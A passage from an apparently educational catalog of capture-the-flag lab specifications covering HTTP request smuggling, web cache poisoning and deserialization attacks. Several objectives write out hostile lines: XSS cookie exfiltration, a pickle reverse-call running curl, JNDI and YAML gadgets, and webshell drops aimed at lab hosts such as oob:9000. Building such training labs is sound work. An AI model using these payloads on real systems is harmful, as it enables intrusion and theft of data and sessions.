labs.objective: Smuggle `POST /api/comment HTTP/1.1` with body `{"author":"admin","body":"pwn"}` so the backend attributes the comment to the admin user, whose session token is then written into the smuggled response the next victim consumes. Exfil the token to `http://collab:9000/`.
labs.flag_hint: OOB collector on port 9000 (Python http.server) writes any received token to /shared/tokens.log; a sidecar checker exposes GET /solve which returns the flag when a valid admin token is observed.
labs.inspired_by: PortSwigger 'basic TE.CL vulnerability' lab family

labs.title: Unkeyed X-Forwarded-Host: The Free Redirect
labs.description: A Varnish 7.5 cache in front of a Django app. The app reflects `X-Forwarded-Host` into a canonical `<link rel=canonical>` and into a JS asset URL, but Varnish only keys on Host+path. First contact with the mental model 'unkeyed input + reflected output = cache poison for everyone'.
labs.objective: Poison the cached response for `GET /` so subsequent unauthenticated requests receive a `<script src=//attacker.example/pwn.js>` reference. The victim bot (a headless Chromium loop) fetches `/` every 3 s and its console log is monitored.
labs.flag_hint: Sidecar `checker.sh` tails the victim bot's console log; when a request for /pwn.js is observed from the victim's origin, checker writes /flag.txt and exposes GET /flag on port 8080.
labs.inspired_by: James Kettle 'Practical Web Cache Poisoning' (DEF CON 26, 2018) — apprentice version

labs.title: Web Cache Deception: The .css Trick
labs.description: nginx caches by static extension (`.css`, `.js`, `.png`). The Rails backend serves `/account/profile` normally and, thanks to loose routing, also serves the same authenticated content at `/account/profile/anything.css`. You'll learn Omer Gil's original deception pattern and how exact-match caching would have prevented it.
labs.objective: Cause an authenticated admin's `/account/profile` (containing an API key) to be cached under a public URL. Fetch it unauthenticated and submit the leaked API key to `POST /solve`.
labs.flag_hint: POST /solve with JSON {"api_key":"..."} returns the flag if the key matches the admin row in Postgres.
labs.inspired_by: Omer Gil 'Web Cache Deception Attack' (Black Hat USA 2017)

labs.title: Nginx alias Traversal: The Missing Slash
labs.description: A single `location /static { alias /var/www/assets; }` (note: no trailing slash on the location) lets `/static../etc/passwd` resolve to `/var/www/assets../etc/passwd` → `/var/www/etc/passwd`-adjacent traversal. Classic Detectify finding, minimal reproduction, with a diff toggle showing the correct config.
labs.objective: Read `/flag.txt` located at container path `/var/www/secret/flag.txt` via alias traversal from `/static`.
labs.flag_hint: The flag is the literal file /var/www/secret/flag.txt inside the nginx container; a browser fetch of the crafted URL returns it as the HTTP body.
skills_taught: path normalization at the proxy layer
labs.inspired_by: Detectify 'Common Nginx Misconfigurations' + Orange Tsai reverse-proxy talks

labs.title: TE.TE Ladder: Ten Ways to Hide Transfer-Encoding
labs.description: A tiered proxy (custom Go reverse proxy with a switchable strictness dial) and an Apache 2.4 backend both understand Transfer-Encoding, but you must find an obfuscation the proxy rejects/ignores while the backend still honors. Ten sub-levels, each a bypass rung: leading space, tab, doubled header, `Transfer-Encoding : chunked`, `Transfer-encoding: xchunked`, `Transfer-Encoding\n: chunked`, vertical tab, `chunked, identity`, `Content-Length: 0\r\nTransfer-Encoding: chunked`, and Unicode homoglyph.
labs.objective: Clear all 10 rungs. Each rung, when smuggled successfully, appends its rung number to `/proc/state`. When all 10 are set, `/flag` unlocks.
labs.flag_hint: GET /flag returns the flag only when checker.sh sees ten distinct rung markers in /shared/state.log within the same container lifetime.
labs.inspired_by: PortSwigger 'obfuscating the TE header' series + Regilero 'Hiding Wookies in HTTP' (DEF CON 25)

labs.title: CL.0 Desync: The Header the Front-End Forgot
labs.description: A front proxy accepts and forwards a POST with a body but strips Content-Length before forwarding (thinking it's normalizing). The backend, seeing no CL and no TE, treats the body as the start of the next request. James Kettle's CL.0 pattern with a plausible cause: a WAF rule that removed suspicious CL values.
labs.objective:
Smuggle a `GET /admin/backup HTTP/1.1
Host: internal

` as the tail of a benign POST so the next pipelined connection serves an admin backup. Read the archive listing and locate the flag file.
labs.flag_hint: The smuggled response body contains a directory listing including `flag-<random>.txt`; the flag is inside; a checker also exposes GET /solve accepting the exact filename.
labs.inspired_by: James Kettle 'Browser-Powered Desync Attacks' + 'CL.0' research (2022)

labs.title: H2.CL: HTTP/2 Downgrade with Injected Content-Length
labs.description: Cloudflare-style edge speaks HTTP/2 and downgrades to HTTP/1.1 origin. The origin trusts the CL rewritten from the h2 :content-length pseudo. You inject a header `Content-Length: 0` inside the h2 request; the edge preserves it verbatim in the downgrade, causing the origin to close the request early and treat the body as a new request.
labs.objective: Poison the socket so the admin's next request is answered with your smuggled `/api/reset-password` response, causing the admin password reset token to be delivered to you. Use the token to log in as admin and read `/flag`.
labs.flag_hint: Once logged in as admin, GET /flag returns the flag; session validation is enforced by Redis.
labs.inspired_by: James Kettle 'HTTP/2: The Sequel is Always Worse' (Black Hat USA 2021)

labs.title: Fat GET: Bodies Where None Are Expected
labs.description: The cache treats GET as bodyless; the backend framework parses the body as form data. Send a GET with `Content-Length: N` and `id=admin` in the body — the cache stores the response with a manipulated key while the backend acts on the body input. Perfect for reflected-body cache poisoning.
labs.objective: Poison the cached homepage so all visitors see `Welcome, admin!` prefilled with an XSS payload `"><script>fetch('http://collab:9000/'+document.cookie)</script>` in the greeting.
labs.flag_hint: OOB collector on port 9000 writes any received cookie to /shared/hits.log; checker exposes GET /solve which returns the flag when a valid session cookie (validated against Redis) is observed.
labs.inspired_by: PortSwigger 'Web Cache Poisoning' academy 'Fat GET' family

labs.title: Parameter Cloaking: When ; and & Disagree
labs.description: The cache normalizes query strings and drops parameters after `;`; the Ruby backend parses `;` as a parameter separator (legacy semi-colon). Result: cache key excludes a parameter that changes the response. Classic HPP-style cache poison, requires reading Rack's parameter parser.
labs.objective: Craft `/search?q=cats;q=` so cache stores the XSS'd response under the innocent key `/search?q=cats`. Victim bot must trigger the alert callback recorded via CSP report-to.
labs.flag_hint: CSP report-to endpoint on the collaborator container logs violations; checker returns flag via GET /solve when a violation from the victim origin is recorded.
labs.inspired_by: Snyk 'HTTP Parameter Pollution' primer + PortSwigger 'parameter cloaking' lab

labs.title: Cache Keys and Case: When /Admin != /admin
labs.description: The CDN keys on the raw path; the Go backend lower-cases it before routing. `/Admin` and `/admin` share the same handler but occupy different cache entries. You use this to seed a poisoned entry that only certain victims (matching a case-permuting client library) will hit.
labs.objective: Poison `/Admin/notifications` with a fake system-notice link that, when clicked by an admin (case-preserving client), triggers a CSRF to promote user `guest`. Read `/flag` as guest.
labs.flag_hint: GET /flag returns the flag if users.role for guest equals 'admin' (Postgres row check via sidecar checker).
labs.inspired_by: Iustin Ladunca (Youstin) & PortSwigger 'cache key normalization' research

labs.title: HEAD Trip: Cache Poisoning via Reflected HEAD Body
labs.description: A misconfigured origin returns a body for HEAD (RFC violation) that reflects `X-Forwarded-Scheme`. The cache stores that body and serves it for later GETs to the same key. You learn HEAD-based poison — rare and elegant.
labs.objective: Poison `/dashboard` so its stored body is a redirect to an attacker-controlled URL containing the admin's referrer-leaked session token.
labs.flag_hint: OOB collector on port 9000 captures any admin-session-token query parameter; checker returns flag on GET /solve once a valid session token is captured.
skills_taught: reflected header discovery in HEAD responses
tech_stack: Java 21 + Spring Boot 3.3 (custom filter returning HEAD bodies)
labs.inspired_by: PortSwigger 'cache poisoning with a HEAD request' lab

labs.title: Varnish VCL Bypass: The Regex That Wasn't
labs.description: A VCL snippet forbids `/admin` unless a signed cookie is present. The regex is `^/admin$` — anchored, case-sensitive, no normalization. You bypass with `/admin/`, `//admin`, `/./admin`, and `/%61dmin`; each attempt is graded and only the first working one is accepted per rung.
labs.objective: Reach the internal `/admin/debug` endpoint that prints environment variables including `FLAG=`.
labs.flag_hint: The /admin/debug response body contains the flag as an environment variable; the client just needs to read it. Sidecar checker also exposes GET /solve accepting the FLAG string.
skills_taught: percent-encoding to defeat literal string checks
labs.inspired_by: Assetnote & Detectify VCL bypass writeups (2022–2024)

labs.title: WCD Delimiters: ;, %00, and the Framework Underneath
labs.description: Cloudflare-style cache treats `/profile.css` as static; various backends split paths on `;`, `%00`, `%3B`, `!`, `?`, or accept matrix parameters. Six rungs, one per delimiter — each teaches how the cache and the framework parse paths differently.
labs.objective: For each of the 6 delimiter rungs, cause a distinct sensitive endpoint (`/api/token`, `/api/2fa-seed`, `/api/backup`, `/api/keys`, `/api/audit`, `/api/webhook-secret`) to be cached publicly. Collect all 6 leaked values.
labs.flag_hint: POST /solve with all 6 leaked strings in a JSON array returns the flag when all match; validated by sidecar checker against known values.
skills_taught: framework path parser reading (Express, Rails, Spring, Symfony, Django, Flask)
tech_stack: 6 backends: Node/Express, Rails, Spring Boot 3.3, Symfony 7, Django 5, Flask 3
labs.inspired_by: Kettle & Perimeter X 'Cached and Confused' (USENIX 2020) + PortSwigger WCD lab suite

labs.title: Cookie as Unkeyed Input: Poison the Language Selector
labs.description: A CDN keys only on Host+path; the origin varies output based on a `lang=` cookie but the cache doesn't Vary on it. Setting `lang='"><script>...</script>` inside a request the CDN thinks is 'the same' poisons the shared cache entry.
labs.objective: Poison `/` so all visitors receive an XSS that exfils `document.cookie` to `http://collab:9000/`.
labs.flag_hint: OOB collector captures received cookies; checker exposes GET /solve returning the flag when an admin session cookie (validated against Redis) is captured.
labs.inspired_by: James Kettle 'Practical Web Cache Poisoning' — cookie chapter

labs.title: H2.TE with CRLF-in-Pseudo-Header
labs.description: nginx-quic edge accepts HTTP/2 and downgrades; a lax h2 parser lets you inject `\r\n` inside `:path` (or a regular header value), and after downgrade to HTTP/1.1 that becomes a real CRLF, injecting a full `Transfer-Encoding: chunked` header the origin honors while the edge saw only the pseudo.
labs.objective: Land a smuggled `POST /internal/rotate-key` on the origin. Read the rotation log to obtain the previous key, then use it to decrypt `/flag.enc` (also served on demand).
labs.flag_hint: GET /flag returns the encrypted blob; checker's POST /solve accepts the plaintext (verified against a stored hash). A rotation log endpoint /internal/log is served plainly once the smuggle lands.
labs.inspired_by: James Kettle 'HTTP/2: The Sequel is Always Worse' (2021) + Ambionics 'H2C smuggling' writeups

labs.title: Expect: 100-continue Smuggling
labs.description: The front-end honors `Expect: 100-continue` and waits for the body; the back-end doesn't and immediately parses whatever bytes arrive. You use the timing gap to smuggle bytes that the front-end thinks are 'body-in-transit' but the back-end interprets as a new request. Adds a wire-timing debugger visualizing each byte's fate.
labs.objective: Smuggle a `PUT /admin/users/guest {"role":"admin"}` request that the backend attributes to the currently-authenticated admin (based on socket association). Read `/flag` as guest.
labs.flag_hint: GET /flag returns the flag when users.role for 'guest' is 'admin' in Postgres (sidecar checker).
labs.inspired_by: regilero.github.io 'Expect Smuggling' + Kettle Desync followups

labs.title: Request Tunneling: Read the Admin's Reply
labs.description: Unlike smuggling into an admin session, tunneling stitches your smuggled request into the front→back connection so the response returns to YOU. You'll learn to align chunk boundaries so both the admin's response and your tunneled response fit in one edge-side buffer, and to distinguish 'my response' from 'their response'.
labs.objective: Tunnel `GET /admin/api/keys HTTP/1.1` and read the admin's `x-api-key: ...` returned in your response body. Submit the key to POST /solve.
labs.flag_hint: POST /solve with JSON {"key":"..."} returns the flag when the key matches Redis-stored value.
labs.inspired_by: PortSwigger 'response queue poisoning' + Bishop Fox smuggling research (2023)

labs.title: Browser-Powered Desync: Weaponize the Victim's Browser
labs.description: The origin has a CL.0 desync accessible only from browsers that reuse HTTP/1.1 connections (Chrome connection coalescing). You craft a cross-origin `fetch(..., {method:'POST', mode:'no-cors', body:'GPOST /account HTTP/1.1...'})` that pollutes the victim's own next request to the target. Attacker page runs on a separate origin container.
labs.objective: From an attacker origin loaded in the victim bot's browser, poison the victim's own next request so their `/account` returns the attacker's email as recovery contact. Then trigger password reset and receive it at collab:9000.
labs.flag_hint: OOB collector receives the password reset email; checker returns flag on GET /solve when reset token is valid (checked against Redis).
labs.inspired_by: James Kettle 'Browser-Powered Desync Attacks' (Black Hat USA 2022)

labs.title: Single-Packet Race: One-in, All-Out
labs.description: Withdrawing gift card credit is limit-checked, but the check-then-write is racy. Ordinary parallel requests lose to jitter. You use the single-packet attack (Kettle) to bundle 20 requests into one TCP packet using HTTP/2's END_STREAM, causing the origin to process them in the same event-loop tick.
labs.objective: Redeem a $10 gift card 20 times (should be once) and reach balance = $200 on account 'guest'. That balance triggers the flag.
labs.flag_hint: GET /flag returns the flag when Postgres row for guest shows balance >= 200 (checker sidecar).
labs.inspired_by: James Kettle 'Smashing the state machine' (Black Hat USA 2023) — single-packet attack

labs.title: TE.0 Desync: The Zero-Length Chunk Nobody Read
labs.description: The edge honors TE:chunked and forwards the request; the origin doesn't understand TE and thinks the request body length is 0 (no CL either). Your smuggled bytes after the `0\r\n\r\n` terminator get read as the next request. Narrow but real (seen against certain Kubernetes ingress origins in 2023).
labs.objective: Smuggle a `GET /internal/metrics HTTP/1.1` and read Prometheus metrics that expose a JWT signing key in a debug label. Forge an admin JWT and read /flag.
labs.flag_hint: Bearer JWT signed with the leaked key against GET /flag returns the flag; jwt-cli or jose can sign.
skills_taught: JWT forgery from leaked HMAC keys
labs.inspired_by: Assetnote 'TE.0' & Bishop Fox 2023 smuggling research

labs.title: WebSocket Smuggling: Downgrading Upgrade
labs.description: The proxy blocks direct WebSocket upgrades to `/internal-ws` from the internet, but the origin will happily upgrade any path. You smuggle a second `Upgrade: websocket` request past the proxy that lands directly on the internal WS handler, then run WS-level attacks (arbitrary internal channel subscribe).
labs.objective: Upgrade to the internal 'admin-channel' WebSocket, subscribe to `flag-broadcaster`, and receive the flag broadcast every 10 s.
labs.flag_hint: The internal WS server broadcasts the flag on the admin-channel; the client just needs to reach it. Sidecar checker also exposes /solve accepting the flag string for validation.
labs.inspired_by: Mikhail Egorov 'WebSocket Smuggling' Zero Nights 2020 + PortSwigger writeups

labs.title: Elite Chain: H2.CL → SSRF → Cache Poison → Admin Takeover
labs.description: Multi-stage: (1) H2.CL smuggle a request to an internal-only `/render?url=` SSRF endpoint; (2) use SSRF to reach the internal cache-manager API and inject a poisoned entry for `/admin`; (3) wait for admin bot to hit the poisoned entry, triggering XSS that exfils the admin session; (4) log in as admin and read `/flag`. Requires assembling the whole chain in a single Burp project file with correct connection reuse.
labs.objective: End state: authenticated as admin, GET /flag returns the flag.
labs.flag_hint: GET /flag with a valid admin session returns the flag; session validated against Redis by sidecar.
skills_taught: chaining smuggle → SSRF → cache poison → XSS → session hijack
labs.inspired_by: James Kettle 'HTTP/2 Downgrade Chains' + composite of 2022–2024 HackerOne disclosures

labs.title: Elite Chain: Web Cache Deception + Smuggling for Silent ATO
labs.description: Two-vulnerability chain: use CL.TE smuggling to force an admin's browser to fetch `/account/settings/x.css`, which under a Rails route ambiguity returns the admin's settings HTML (including their MFA recovery codes). The cache stores it; you retrieve it from an unauthenticated session. Then reset MFA and log in.
labs.objective: Log in as admin with a rotated MFA and read /flag.
labs.flag_hint: Authenticated admin GET /flag returns the flag; MFA rotation is checked server-side.
labs.inspired_by: Composite of Omer Gil WCD + Kettle smuggle chains reported to HackerOne 2023

labs.title: HTTP/2 Rapid Reset (CVE-2023-44487): Measured DoS
labs.description: Educational reproduction of Rapid Reset against a patched vs unpatched nghttp2/nginx pair. You'll open many streams and immediately RST_STREAM, observing CPU pinning on unpatched, and mitigation kicks on patched. Metrics dashboard shows RPS, CPU, and dropped-frames graphs. Strictly a lab — network isolated to the compose network with hard rate caps to protect the host.
labs.objective: Complete the guided worksheet: (a) demonstrate degraded response times on the unpatched service, (b) demonstrate mitigation on the patched service, (c) explain in the writeup file the exact stream-open / RST_STREAM ratio needed. Submit the ratio to /solve.
labs.flag_hint: POST /solve with your measured ratio and a passing metrics window (validated by sidecar Prometheus queries) returns the flag.
skills_taught: measuring DoS impact ethically in isolated env
tech_stack: Go 1.23 h2 tester (custom RST loop, hard-capped)
Docker Compose v2.29 with CPU limits
labs.inspired_by: CVE-2023-44487 disclosures by Google, AWS, and Cloudflare (October 2023)

labs.title: Elite Chain: Worker Misconfig + Origin CL.TE = Auth Bypass
labs.description: A simulated Cloudflare Worker (workerd runtime in the compose) rewrites requests to the origin but preserves a caller-controlled `x-forwarded-user` header. The origin behind it trusts that header for auth AND has a latent CL.TE. You combine: (1) send from the worker's callable route to reach the origin; (2) smuggle a request that sets `x-forwarded-user: admin` on the NEXT victim connection; (3) that victim happens to be a health-check poll from Cloudflare itself, cached as admin.
labs.objective: Cause an unauthenticated request to `/admin/status` from your session to return admin content (via cached response), extract a bootstrap token, and use it against /solve.
labs.flag_hint: POST /solve with the extracted bootstrap token returns the flag (validated against Redis).
skills_taught: reasoning about health-check polls as victims
labs.inspired_by: Assetnote 'Cloudflare Workers to origin trust' writeups (2023) + Kettle CL.TE composite

labs.title: PHP __wakeup Basics
labs.description: A profile-preferences service accepts a base64-encoded serialized PHP object via a 'pref' cookie. The Preferences class defines a __wakeup() magic method that calls file_get_contents($this->cachePath) and echoes the result into an HTML debug comment. Craft a serialized Preferences object whose cachePath property points at /flag.txt, submit it as the cookie, then scrape the flag out of the response HTML.
labs.objective: Forge the pref cookie so the __wakeup gadget reads /flag.txt and returns its contents in the response HTML, then POST that exact string to /solve.
labs.flag_hint: HTTP endpoint POST /solve compares the submitted 'flag' form field against the contents of /flag.txt (mounted read-only inside the container) and returns the flag string on match.
labs.inspired_by: PortSwigger 'Modifying serialized objects' — expanded with a real magic-method file-read gadget

labs.title: Pickled Session
labs.description: A Flask 'diary' app stores logged-in-user state in a session cookie shaped as base64(pickle.dumps(dict)). pickle.loads() runs on every request before auth. Craft a class whose __reduce__ returns (os.system, ('curl -X POST --data-binary @/flag.txt http://oob:9000/log',)), submit it as the cookie, and let the bundled OOB collector capture the flag.
labs.objective: Trigger the pickled __reduce__ gadget so /flag.txt is POSTed to the in-network OOB collector at http://oob:9000/log, then submit the captured value to /solve.
labs.flag_hint: POST /solve compares the submitted 'flag' body to the last line stored by the oob collector (which itself validated against /flag.txt via a shared read-only mount); returns the flag string on success.
labs.inspired_by: Classic Python pickle CTF challenges; David Beazley 'Python cookies' demo

labs.title: Marshalled Memories
labs.description: A tiny Sinatra journal app deserializes the current user's Session object from a 'mem' cookie via Marshal.load(Base64.decode64(cookie)). Craft a Marshal payload that instantiates an ERB template `<%= File.read('/flag.txt') %>` and stuffs it into the username slot the app later renders on GET /home.
labs.objective: Build a Marshal payload that causes the ERB gadget to render /flag.txt into the greeting on /home, then paste the flag into /solve.
labs.flag_hint: POST /solve validates the submitted 'flag' against /flag.txt inside the container and returns the flag on match.
labs.inspired_by: Elttam 2018 'Ruby 2.x Universal RCE Deserialization Gadget Chain'

labs.title: Deserialize My Cookies
labs.description: An Express admin dashboard uses node-serialize@0.0.4 to unserialize() a base64 'profile' cookie. That library eagerly eval()s function bodies wrapped with the sentinel `_$$ND_FUNC$$_`. Craft an IIFE payload that executes child_process.exec to copy /flag.txt to a directory served by the app's own /debug/leak endpoint.
labs.objective: Deliver an IIFE payload via the profile cookie that runs `cp /flag.txt /app/public/leak.txt`, fetch /debug/leak, and submit the flag to /solve.
labs.flag_hint: POST /solve compares the submitted flag body against /flag.txt and returns the flag on match.
labs.inspired_by: Ajin Abraham 2017 Opsecx post 'Exploiting Node.js deserialization bug for Remote Code Execution'

labs.title: BinaryFormatter Rides Again
labs.description: A legacy internal report-download endpoint deserializes a base64 'X-Report-State' header via BinaryFormatter. Use ysoserial.net's TextFormattingRunProperties gadget to trigger command execution inside the IIS worker process and copy /flag.txt into the app's static folder.
labs.objective: Deliver a ysoserial.net TextFormattingRunProperties payload to the X-Report-State header, causing `cmd /c type C:\flag.txt > C:\inetpub\wwwroot\static\leak.txt`, then fetch /static/leak.txt and submit to /solve.
labs.flag_hint: POST /solve compares the submitted 'flag' body against C:\flag.txt (or /flag.txt on the Linux .NET variant) and returns the flag on match.
labs.inspired_by: James Forshaw's 2017 BinaryFormatter research; ysoserial.net TextFormattingRunProperties plugin

labs.title: readObject Rendezvous
labs.description: A Spring Boot 3.2 admin panel exposes POST /api/state which base64-decodes the request body and hands the bytes to ObjectInputStream.readObject(). The classpath ships a Beacon class whose readObject() override calls Runtime.exec(this.cmd). Serialize a Beacon with a shell command that exfils /flag.txt to the bundled OOB collector.
labs.objective: Serialize a Beacon instance whose cmd field runs `sh -c 'curl --data-binary @/flag.txt http://oob:9000/log'`, POST it base64-encoded to /api/state, then submit the captured value to /solve.
labs.flag_hint: POST /solve compares the submitted flag against the value the oob collector received; the collector validates against /flag.txt via a shared read-only mount.
labs.inspired_by: Foundational Java deserialization primers (Chris Frohoff, Gabriel Lawrence 'Marshalling Pickles' AppSecCali 2015)

labs.title: Monolog Gadget Rodeo
labs.description: A Symfony 6.4 debug endpoint accepts a serialized PHP object POSTed as `state`. Composer autoload includes monolog/monolog 2.8 and its transitive dependencies. Build the PHPGGC 'Monolog/RCE1' or 'Monolog/RCE6' POP chain (SyslogUdpHandler → BufferHandler → assert()) to invoke a shell that base64-exfils /flag.txt to the OOB collector.
labs.objective: Deliver a working Monolog RCE POP chain via the state parameter to run `sh -c 'curl --data-binary @/flag.txt http://oob:9000/log'`; then submit the exfiltrated flag to /solve.
labs.flag_hint: POST /solve reads the last blob recorded by the oob collector, checksum-compares against /flag.txt, and returns the flag on match.
labs.inspired_by: ambionics-security PHPGGC library (Monolog/RCE family of chains)

labs.title: Phar File Foundry
labs.description: A gallery app accepts image uploads at POST /upload (validated only by JPEG magic bytes) and later renders tags after calling file_exists($_GET['thumb']) — where 'thumb' can start with `phar://`. Craft a JPEG-phar polyglot containing a serialized Guzzle FW1 gadget that writes an arbitrary PHP file, then trigger the phar:// dereference to drop /var/www/html/s.php and grab /flag.txt.
labs.objective: Upload a JPEG-phar polyglot, dereference it via ?thumb=phar://uploads/xxx.jpg/foo, chain to a Guzzle FW1 gadget that writes /var/www/html/s.php, visit the webshell, and read /flag.txt.
labs.flag_hint: POST /solve compares the submitted flag against /flag.txt (mounted read-only) and returns it on match.
labs.inspired_by: Sam Thomas 2018 BlackHat 'It's a PHP Unserialization Vulnerability Jim, But Not As We Know It'

labs.title: YAML of the Damned
labs.description: A FastAPI ops-dashboard accepts a POSTed YAML config which is parsed with yaml.load(data, Loader=yaml.Loader) (not SafeLoader). Send a `!!python/object/apply:subprocess.check_output` node with a shell array that copies /flag.txt into the app's /static folder, then fetch the static file.
labs.objective: POST a YAML payload whose python/object/apply node runs `cp /flag.txt /app/static/note.txt`; fetch /static/note.txt; submit its contents to /solve.
labs.flag_hint: POST /solve compares the submitted flag against /flag.txt and returns it on match.
labs.inspired_by: CVE-2020-1747 (PyYAML unsafe Loader default)

labs.title: Polymorphic Jackson
labs.description: A Spring Boot 2.7 accounts microservice enables ObjectMapper.enableDefaultTyping(NON_FINAL). The classpath contains com.mchange:c3p0. Submit JSON with `"@class":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://oob:1389/a"` and serve a marshalsec LDAP referral (bundled in-network) pointing at a hosted class that runs the flag-exfil shell.
labs.objective: Chain Jackson polymorphic typing → c3p0 JndiRefForwardingDataSource → LDAP referral → hosted class → RCE that curls /flag.txt to http://oob:9000/log.
labs.flag_hint: POST /solve reads the oob collector's last log line, validates against /flag.txt, and returns the flag.
labs.inspired_by: CVE-2019-14540 / CVE-2020-8840 (jackson-databind polymorphic-typing gadgets)

labs.title: XStream, X-code, X-shell
labs.description: A REST XML endpoint uses XStream 1.4.17 with default converters. Craft the ImageIO / EventHandler XStream gadget XML that instantiates a proxy invoking Runtime.exec on your shell command.
labs.objective: POST the ImageIO/EventHandler XStream XML payload to /api/xml so it runs `sh -c 'curl --data-binary @/flag.txt http://oob:9000/log'`; submit the captured flag to /solve.
labs.flag_hint: POST /solve validates the submitted flag against the oob collector's last log, which is compared to /flag.txt on disk.
labs.inspired_by: CVE-2021-39144 (XStream RCE via ImageIO chain)

labs.title: TypeNameHandling.All
labs.description: An ASP.NET Core 6 minimal API deserializes user JSON with Newtonsoft.Json and TypeNameHandling = All. The runtime bundles PresentationFramework. Send a payload with `"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"` chained to System.Diagnostics.Process.Start to execute a flag-exfil shell command.
labs.objective: Deliver a JSON.NET ObjectDataProvider payload to /api/import that runs `bash -c 'curl --data-binary @/flag.txt http://oob:9000/log'`; submit the captured flag to /solve.
labs.flag_hint: POST /solve reads oob:9000/last, compares against /flag.txt, and returns the flag on match.
labs.inspired_by: Alvaro Muñoz & Oleksandr Mirosh 'Friday the 13th JSON attacks' (BlackHat 2017)

labs.title: Escaping vm2
labs.description: A 'run my snippet' playground uses vm2@3.9.16 to sandbox user JavaScript. Use the Error.prepareStackTrace / async proxy trick to obtain a reference to the host process, then `require('fs').readFileSync('/flag.txt','utf8')` and return the value as the snippet result.
labs.objective: Craft a snippet that escapes vm2 via the CVE-2023-30547 pattern, reads /flag.txt from the host FS, and returns it as the eval-endpoint's response body.
labs.flag_hint: POST /solve compares the submitted flag body against /flag.txt and returns the flag on match.
skills_taught: Node module resolution from escaped context
labs.inspired_by: CVE-2023-30547 (Xiaofen9 disclosure of vm2 sandbox escape)

labs.title: SnakeYAML Constructor Chomp
labs.description: A Spring Boot 2.6 service parses an uploaded YAML with SnakeYAML 1.30's default Constructor (not SafeConstructor). Use the classic `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://oob:9000/exploit.jar"]]]]` gadget to load a JAR whose ServiceLoader entry runs your flag-exfil.
labs.objective: Host exploit.jar on the bundled in-network web server, POST the YAML gadget to /upload, and have the SPI-loaded class curl /flag.txt to http://oob:9000/log; submit the captured flag to /solve.
labs.flag_hint: POST /solve validates the submitted flag against the oob collector's last log entry, which is compared to /flag.txt.
labs.inspired_by: CVE-2022-1471 (SnakeYAML unsafe default Constructor)

labs.title: Which Commons-Collections?
labs.description: A Tomcat 9 servlet accepts serialized POST bodies. The classpath ships both commons-collections 3.2.1 and commons-collections4 4.0, plus a JEP-290 ObjectInputFilter that blocks a subset of TransformerMap patterns. Enumerate ysoserial's CC1/CC3/CC5/CC6/CC7 variants, identify which one both survives the filter and works against JDK 8u201, and land RCE.
labs.objective: Identify the working ysoserial Commons-Collections chain against this filter+JDK combination, achieve RCE, and exfil /flag.txt to http://oob:9000/log; submit the captured flag to /solve.
labs.flag_hint: POST /solve reads oob:9000/last, compares against /flag.txt, and returns the flag on match.
labs.inspired_by: Foxglove Security 2015 'What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common?'

labs.title: Fastjson AutoType Ladder
labs.description: A payments microservice uses Fastjson 1.2.68 with autoTypeSupport=false. Bypass it using the expectClass mechanism (ThrowableDeserializer / L-descriptor prefix trick) to smuggle in a JNDI-triggering type, then complete the JNDI chain via the bundled marshalsec LDAP server.
labs.objective: Craft a Fastjson autoType-bypass payload that ends in a JNDI lookup to the bundled marshalsec LDAP server, achieve RCE, and exfil /flag.txt to http://oob:9000/log; submit the captured flag to /solve.
labs.flag_hint: POST /solve reads oob:9000/last, compares against /flag.txt, and returns the flag on match.
labs.inspired_by: CVE-2022-25845 and the Alibaba Fastjson autoType bypass CVE series

labs.title: Log4Shell Reproduced
labs.description: A microservice logs the User-Agent header with Log4j 2.14.1. Inject `${jndi:ldap://oob:1389/a}` so the JNDI lookup fetches a serialized referral from the bundled marshalsec LDAP server, which points at a hosted Exploit.class served on the in-network Python http.server; classloading runs the exfil shell.
labs.objective: Chain Log4j lookup → LDAP referral → hosted class → RCE that runs `sh -c 'curl --data-binary @/flag.txt http://oob:9000/log'`; submit the captured flag to /solve.
labs.flag_hint: POST /solve reads oob:9000/last, compares against /flag.txt, and returns the flag on match.
labs.inspired_by: CVE-2021-44228 (Log4Shell)

labs.title: ViewState Without a MAC
labs.description: An ASP.NET WebForms 4.8 app ships with enableViewStateMac="false" in web.config. Generate a ViewState with ysoserial.net's `--plugin=ViewState --generator=TextFormattingRunProperties` and POST it as __VIEWSTATE to any .aspx page — ObjectStateFormatter deserializes it inside the IIS worker.
labs.objective: Deliver a ysoserial.net ViewState payload that runs `type C:\flag.txt > C:\inetpub\wwwroot\static\leak.txt`, fetch /static/leak.txt, and submit the value to /solve.
labs.flag_hint: POST /solve compares the submitted flag against C:\flag.txt and returns the flag on match.
labs.inspired_by: Blue Frost Security research on ASP.NET ViewState attacks; Soroush Dalili write-ups

labs.title: WP Legacy Plugin phar://
labs.description: A WordPress 5.9 install ships an intentionally vulnerable plugin 'wp-file-inspector' that calls file_exists($_GET['file']) on user input. Upload a JPEG-phar polyglot via the Media Library (the thumbnail path accepts it), then trigger `?file=phar://wp-content/uploads/2024/01/foo.jpg`. The gadget rides WordPress's bundled Requests library to write a webshell.
labs.objective: Upload the JPEG-phar polyglot, trigger phar dereference, chain to the bundled WordPress Requests gadget to write a webshell, then read /flag.txt through the shell and submit to /solve.
labs.flag_hint: POST /solve compares the submitted flag against /flag.txt (mounted read-only in the WordPress container) and returns the flag on match.
labs.inspired_by: Sam Thomas 2018 BlackHat + Secarma 'phar:// deserialization' research + real-world plugin CVEs (e.g. CVE-2018-20148 Contact Form 7 style)

labs.title: Ignition Debug RCE
labs.description: A Laravel 8.29 app is running with APP_DEBUG=true and facade/ignition 2.5.1. Trigger a ViewException via the login form, then POST to /_ignition/execute-solution with the MakeViewVariableOptionalSolution — combined with a preceding log-poisoning step that writes phar contents into the Laravel log — to chain phar deserialization → RCE and read /flag.txt.
labs.objective: Chain log-poisoning + Ignition MakeViewVariableOptionalSolution + phar deserialization to achieve RCE, read /flag.txt, and submit it to /solve.
labs.flag_hint: POST /solve compares the submitted flag against /flag.txt (mounted read-only) and returns the flag on match.
labs.inspired_by: CVE-2021-3129 (Charles Fol / Ambionics disclosure)

labs.title: Model Registry Munch
labs.description: An MLOps registry accepts uploaded .pkl models via POST /model. A Celery worker pulls them from Redis and calls cloudpickle.loads(blob) for inference. Craft a cloudpickle payload whose __reduce__ side-effects run in the worker (which has no outbound egress but can write to Redis keys reachable via the API's GET /results/<key>).
